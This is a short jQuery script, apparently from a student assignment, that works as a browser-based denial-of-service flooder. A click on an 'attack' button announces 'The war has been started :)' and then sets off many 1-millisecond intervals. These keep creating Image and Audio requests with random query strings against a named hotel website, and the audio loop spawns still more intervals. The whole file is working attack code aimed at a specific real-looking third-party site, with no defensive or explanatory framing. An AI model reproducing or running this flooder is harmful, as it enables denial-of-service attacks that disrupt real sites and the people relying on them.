$(function(){


	
	// var port = $('#port').val();
	// var packets = $('#packets').val();
	// var interval = $('#interval').val();
	
   // jQuery methods go here...
   $('#attack').on('click', ()=>{
   		//alert('Clicked');
   		
   		alert("The war has been started :)");

   		
   			setInterval(audioflood , 1);
	   		setInterval(imgflood, 1);
	   		setInterval(audioflood, 1);
	   		setInterval(imgflood, 1);
	   		setInterval(audioflood , 1);
	   		setInterval(imgflood, 1);
	   		setInterval(imgflood, 1);
   	
   		

   // 		console.log($('#host').val());
   // 		$.ajax({
			// 	url: 'http://localhost/Project/SE2/Assign-I/DDOS/mix.php',
			// 	contentType: 'application/json',
			// 	data: {name: 'miki'},
			// 	type: "GET",
			// 	success : function(response){
			// 			console.log(response + " onnnasa");
			// 	}
			// });
   });


   function imgflood() {
   			var host = "harmonyhotelethiopia.com";
			var Target = host;
			var URI = '/index.php?';
			var pic = new Image();
			var rand = Math.floor(Math.random() * 1000);
			pic.src = 'http://'+ Target + URI + rand+ '=val';
	}

	function audioflood() {
			setInterval(imgflood, 1);
			var host = "harmonyhotelethiopia.com";
			var Target = host;
			var URI = '/index.php?';
			var pic = new Audio();
			var rand = Math.floor(Math.random() * 1000);
			pic.src = 'http://'+ Target + URI + rand+ '=val';
	}
		

});